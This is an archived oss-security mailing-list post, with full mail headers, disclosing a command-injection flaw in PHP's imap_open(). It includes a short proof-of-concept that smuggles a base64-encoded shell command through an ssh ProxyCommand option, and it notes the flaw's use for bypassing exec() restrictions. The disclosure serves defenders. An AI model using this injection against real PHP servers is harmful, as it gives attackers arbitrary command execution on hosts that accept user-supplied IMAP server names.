X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1162" "Thursday" "22" "November" "2018" "21:02:14" "+0100" "Hanno =?UTF-8?B?QsO2Y2s=?=" "hanno@hboeck.de" "<20181122210214.240912af@computer>" "36" "[oss-security] PHP imap_open() script injection" nil nil nil "11" "2018112220:02:14" "[oss-security] PHP imap_open() script injection" (number mark "U       hanno@hboeck Nov 22   36/1162  " thread-indent "\"[oss-security] PHP imap_open() script injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22481 invoked by uid 550); 22 Nov 2018 20:02:22 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22449 invoked from network); 22 Nov 2018 20:02:21 -0000
Date: Thu, 22 Nov 2018 21:02:14 +0100
From: Hanno =?UTF-8?B?QsO2Y2s=?= <hanno@hboeck.de>
To: oss-security@lists.openwall.com
Message-ID: <20181122210214.240912af@computer>
X-Mailer: Claws Mail 3.17.1 (GTK+ 2.24.32; x86_64-pc-linux-gnu)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] PHP imap_open() script injection

Hi,

This was apparently posted on some russian forum recently and then
re-posted to github:
https://antichat.com/threads/463395/#post-4254681
https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php

PoC code:
$server =3D "x -oProxyCommand=3Decho\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0M=
DAwMQo=3D|base64\t-d|sh}";
imap_open('{'.$server.':143/imap}INBOX', '', '') or die("\n\nError: ".imap_=
last_error());

It's pretty self explaining, it seems imap_open() will pass things to
ssh and this is vulnerable to a shell injection.

Impact would be mostly relevant if someone has some imap functionality
where a user can define a custom imap server. (Though it might also be
used as a bypass for environments where exec() and similar functions
are restricted.)

I reported it to upstream PHP a few days ago, it was closed as a
duplicate, so it seems they already knew about it. It's unfixed in
current versions.

There seems to be some speculation that this might've been involved in a
hack of a .onion hoster:
https://danwin1210.me/


--=20
Hanno B=C3=B6ck
https://hboeck.de/

mail/jabber: hanno@hboeck.de
GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
